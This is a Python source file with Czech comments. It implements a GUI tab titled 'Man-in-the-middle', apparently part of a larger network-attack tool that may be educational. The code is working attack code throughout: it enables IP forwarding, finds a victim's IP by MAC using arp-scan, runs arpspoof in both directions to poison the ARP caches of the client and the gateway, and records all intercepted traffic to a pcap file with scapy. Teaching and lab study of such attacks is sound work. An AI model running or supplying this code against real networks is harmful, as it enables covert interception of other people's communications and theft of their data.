import customtkinter as ctk
from customtkinter import COMMAND, DISABLED, E, EW, HORIZONTAL, N, NO, NORMAL, ON, S, TOP, W
import subprocess
from threading import Thread
import time
import signal
import os
from scapy.all import *
from src import global_names
from src import infos

# ========================================================================================================================
# Globální proměnná pro uchování reference na nekončící procesy pro jejich pozdější ukončení
arpspoof_cl_process = None
arpspoof_ap_process = None
capturing_process = None

output_traffic = global_names.output_traffic
capturing = True

# Uklidím případný soubor output po předešlém spuštění
if os.path.isfile(output_traffic):
    os.remove(output_traffic)

# ========================================================================================================================
# ========================================================================================================================
def start_forwarding():
    print("===== START FORWARDING TRAFFIC ====================")
    try:
        # Zapne přeposílání paketů
        command = "sysctl net.ipv4.ip_forward=1"
        print("COMMAND: " + command + "\n")

        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)        
        print(f"     -- Přeposílání paketů bylo úspěšně zapnuto.\n")

        #global forwarding_on_button
        #global forwarding_off_button
        forwarding_on_button.configure(state=DISABLED) 
        forwarding_off_button.configure(state=NORMAL)

        global arp_spoofing_frame
        global forwarding_frame
        forwarding_frame.configure(fg_color=("gray75", "gray25"))
        arp_spoofing_frame.configure(fg_color=global_names.my_color) 

    except subprocess.CalledProcessError as e:
        print(f"Chyba při zapínání přeposílání paketů: {e}\n")
# ========================================================================================================================
def stop_forwarding():
    print("===== STOP FORWARDING TRAFFIC =====================")
    try:
        # Zapne přeposílání paketů
        command = "sysctl net.ipv4.ip_forward=0"
        print("COMMAND: " + command + "\n")

        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)        
        print(f"     -- Přeposílání paketů bylo úspěšně vypnuto.\n")

        forwarding_off_button.configure(state=DISABLED) 
        forwarding_on_button.configure(state=NORMAL)
    except subprocess.CalledProcessError as e:

        print(f"Chyba při vypínání přeposílání paketů: {e}\n")
# ========================================================================================================================
def find_ip_by_mac(mac_address, interface):

    #print("=== DEBUG: CL MAC: " + mac_address)
    #print("=== DEBUG: Interface: " + interface)
    try:
        # Run arp-scan on the specified interface
        result = subprocess.check_output(['sudo', 'arp-scan', '--interface', interface, '--localnet'], text=True)
        #arp_result = subprocess.check_output(['arp', '-n'], encoding='utf-8')
    except subprocess.CalledProcessError as e:
        print("Nastala chyba při získávánáí MAC adresy:" + e + "\n")
        return 1
    
    try:
        # Iterate through each line of the output
        for line in result.splitlines():
            # Check if the current line contains the MAC address
            if mac_address.lower() in line.lower():
                # Extract and return the IP address
                ip_address = line.split()[0]
                return ip_address
    except Exception as e:
        print(f"Nastala chyba: {e}\n")
        return None

# ========================================================================================================================
def start_arp_spoofing(interface, cl):
    print("===== START ARP SPOOFING ==========================")
    try:
        interface = global_names.interface
        cl = global_names.cl

        command = "ip route | grep default"
        print("COMMAND: " + command)
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid) 
        time.sleep(1)
        out = p.stdout.readline().decode()
        print(out)
        words = out.split()
        ap_ip = words[2]

        #print("=== DEBUG: AP IP: " + ap_ip)
        
        client_ip = find_ip_by_mac(cl, interface)
        if not client_ip:
            print("ERROR při překladu client MAC na IP")
            return

        command = f"sudo arpspoof -i {interface} -t {client_ip} {ap_ip}"
        print("COMMAND: " + command)
        global arpspoof_cl_process 
        arpspoof_cl_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)

        command = f"sudo arpspoof -i {interface} -t {ap_ip} {client_ip}"
        print("COMMAND: " + command + "\n")
        global arpspoof_ap_process 
        arpspoof_ap_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)

        # Nastavuji správně tlačítka
        arp_spoofing_on_button.configure(state=DISABLED) 
        arp_spoofing_off_button.configure(state=NORMAL) 
        # Zapínám pohyb progress baru
        arp_spoofing_progress.grid(row=2,column=0,columnspan=3, sticky=EW, padx=5, pady=5)
        arp_spoofing_progress.start()

        global capturing_frame
        global arp_spoofing_frame
        arp_spoofing_frame.configure(fg_color=("gray75", "gray25"))
        capturing_frame.configure(fg_color=global_names.my_color) 


        print(f"     -- ARP spoofing byl úspěšně spuštěn.\n")
    except subprocess.CalledProcessError as e:
        print(f"Chyba při zapínání ARP spoofingu: {e}\n")
# ========================================================================================================================
def stop_arp_spoofing():
    print("===== STOP ARP SPOOFING ===================================")
    global arpspoof_cl_process 
    global arpspoof_ap_process

    if arpspoof_cl_process:
        os.killpg(os.getpgid(arpspoof_cl_process.pid), signal.SIGTERM)
        print("     -- Process arpspoofing pro klienta byl zastaven.")

    if arpspoof_ap_process:
        os.killpg(os.getpgid(arpspoof_ap_process.pid), signal.SIGTERM)
        print("     -- Process arpspoofing pro access point byl zastaven.")

    # Zastavuji progress bar pro zachytavani handshaku
    global arp_spoofing_progress
    arp_spoofing_progress.stop()
    arp_spoofing_progress.grid_forget()

    global arp_spoofing_on_button
    global arp_spoofing_off_button
    arp_spoofing_on_button.configure(state=NORMAL) 
    arp_spoofing_off_button.configure(state=DISABLED) 
    
    print(f"     --ARP spoofing byl úspěšně zastaven.\n")

# ========================================================================================================================
def capture_packets(interface, output_traffic):
    #global output_traffic
    print("     -- Soubor se zachycennou komunikací: " + output_traffic)
    t = AsyncSniffer(iface=interface, prn=lambda x: wrpcap(output_traffic, x, append=True))
    
    global capturing
    while capturing:
        t.start()
        time.sleep(1)
        t.stop()
# ========================================================================================================================
def start_capturing():
    print("===== START CAPTURING COMPLETE TRAFFIC =================================")
    try:
        # Zapne zachytávání všech paketů
        global output_traffic
        interface = global_names.interface

        global capturing
        capturing = True
        #print("=== DEBUG: poustim thread capture_packets")
        th = Thread(target=lambda: capture_packets(interface, output_traffic), daemon=True)
        th.start()

        capturing_on_button.configure(state=DISABLED) 
        capturing_off_button.configure(state=NORMAL)
        capturing_label.configure(text="Datový provoz na rozhraní " + interface + "je zachytáván do souboru " + output_traffic)

        global_names.finished_tab = 3
        global menu_button
        menu_button.configure(fg_color="transparent", text_color=("green", "green"), image=check_image)
        next_menu_button.configure(state=NORMAL)
        
    except subprocess.CalledProcessError as e:
        print(f"Chyba při zapínání zachytávání paketů: {e}\n")
# ========================================================================================================================
def stop_capturing():
    print("===== STOP CAPTURING TRAFFIC ==============================")
    #global capturing_process
    global capturing
    capturing = False
    if capturing_process:
        os.killpg(os.getpgid(capturing_process.pid), signal.SIGTERM)
        print("     -- Process Zachytávání datového trafiku byl zastaven.\n")

    capturing_off_button.configure(state=DISABLED) 
    capturing_on_button.configure(state=NORMAL)

# ===========================================================
def finish():
    # Funkce vrátí všechny činnosti z tohoto tabu do původního stavu
    stop_capturing()
    stop_arp_spoofing()
    stop_forwarding()

# ========================================================================================================================================
# Tab "Man-in-the-middle" ================================================================================================================
def draw_arp_spoof(window):
    global menu_button
    global check_image
    global next_menu_button
    menu_button = window.frame_4_button
    check_image = window.done_image
    next_menu_button = window.frame_5_button

    # Forwarding Frame ===============================================================================================================
    global forwarding_frame
    forwarding_frame = ctk.CTkFrame(window.T4_frame)
    forwarding_frame.pack(padx=10,pady=5, fill='x')
    forwarding_frame_label = ctk.CTkLabel(forwarding_frame, text="Přeposílání paketů", font=('Open Sans', 16, 'bold'))
    forwarding_frame_label.grid(row=0, column=0, columnspan=2, sticky="w", padx=5, pady=5)
    
    #if global_names.finished_tab == 2:
    forwarding_frame.configure(fg_color=global_names.my_color) 
    

    global forwarding_on_button
    global forwarding_off_button
    forwarding_on_button = ctk.CTkButton(forwarding_frame, text="Zapnout", width= 200, command=start_forwarding)
    forwarding_on_button.grid(row=1, column=0, padx=5, pady=5)

    forwarding_off_button = ctk.CTkButton(forwarding_frame, text="Vypnout", width= 200, state=DISABLED, command=stop_forwarding)
    forwarding_off_button.grid(row=1, column=1, padx=5, pady=5)

    # INFO button
    forward_info_button = ctk.CTkButton(forwarding_frame, text="INFO", width=200, command=infos.info_forward)
    forward_info_button.grid(row=1, column=2, sticky=E, padx=5, pady=5)
    forwarding_frame.grid_columnconfigure(2, weight=1)

    # ARP Spoof Frame ===============================================================================================================
    global arp_spoofing_frame
    arp_spoofing_frame = ctk.CTkFrame(window.T4_frame)
    arp_spoofing_frame.pack(padx=10,pady=5, fill='x')
    arp_spoofing_frame_label = ctk.CTkLabel(arp_spoofing_frame, text="ARP Spoofing", font=('Open Sans', 16, 'bold'))
    arp_spoofing_frame_label.grid(row=0, column=0, columnspan=2, sticky="w", padx=5, pady=5)

    global arp_spoofing_on_button
    global arp_spoofing_off_button
    arp_spoofing_on_button = ctk.CTkButton(arp_spoofing_frame, text="Zapnout", width= 200, command=lambda: start_arp_spoofing(global_names.interface, global_names.cl))
    arp_spoofing_on_button.grid(row=1, column=0, padx=5, pady=5)

    arp_spoofing_off_button = ctk.CTkButton(arp_spoofing_frame, text="Vypnout", width= 200, state=DISABLED,command=stop_arp_spoofing)
    arp_spoofing_off_button.grid(row=1, column=1, padx=5, pady=5)

    # INFO button
    arp_info_button = ctk.CTkButton(arp_spoofing_frame, text="INFO", width=200, command=infos.info_arp)
    arp_info_button.grid(row=1, column=2, sticky=E, padx=5, pady=5)

    global arp_spoofing_progress
    arp_spoofing_progress = ctk.CTkProgressBar(arp_spoofing_frame, orientation=HORIZONTAL, mode='indeterminate')
    #arp_spoofing_progress.step()

    arp_spoofing_frame.grid_columnconfigure(2, weight=1)
    # Capturing Frame ===============================================================================================================
    global capturing_frame
    capturing_frame = ctk.CTkFrame(window.T4_frame)
    capturing_frame.pack(padx=10,pady=5, fill='x')
    capturing_frame_label = ctk.CTkLabel(capturing_frame, text="Zachytávání paketů", font=('Open Sans', 16, 'bold'))
    capturing_frame_label.grid(row=0, column=0, columnspan=2, sticky="w", padx=5, pady=5)

    global capturing_on_button
    global capturing_off_button
    capturing_on_button = ctk.CTkButton(capturing_frame, text="Zapnout", width= 200, command=start_capturing)
    capturing_on_button.grid(row=1, column=0, padx=5, pady=5, sticky=W)

    capturing_off_button = ctk.CTkButton(capturing_frame, text="Vypnout", width= 200, state=DISABLED, command=stop_capturing)
    capturing_off_button.grid(row=1, column=1, padx=5, pady=5, sticky=W)
    
    # INFO button
    capture_info_button = ctk.CTkButton(capturing_frame, text="INFO", width=200, command=infos.info_catch)
    capture_info_button.grid(row=1, column=2, sticky=E, padx=5, pady=5)

    global capturing_label
    capturing_label = ctk.CTkLabel(capturing_frame, text="")
    capturing_label.grid(row=2, column=0, columnspan=3, padx=5, pady=5)

    capturing_frame.grid_columnconfigure(2, weight=1)

